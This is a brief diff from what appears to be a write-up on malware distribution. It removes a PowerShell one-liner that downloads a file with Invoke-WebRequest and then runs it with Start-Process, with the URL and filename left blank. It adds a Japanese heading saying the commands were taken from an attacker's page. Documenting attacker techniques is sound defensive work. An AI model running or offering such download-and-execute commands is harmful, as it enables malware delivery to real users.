@@ -1,3 +1,3 @@
-```ps1
-powershell -Command "$file=''; Invoke-WebRequest -Uri '' -OutFile $file; Start-Sleep -Seconds 2; Start-Process $file"
-```
+## マルウェア配布に攻撃者が使用するコマンドのまとめ
+
+これも攻撃者のページからそのまま拝借しました。
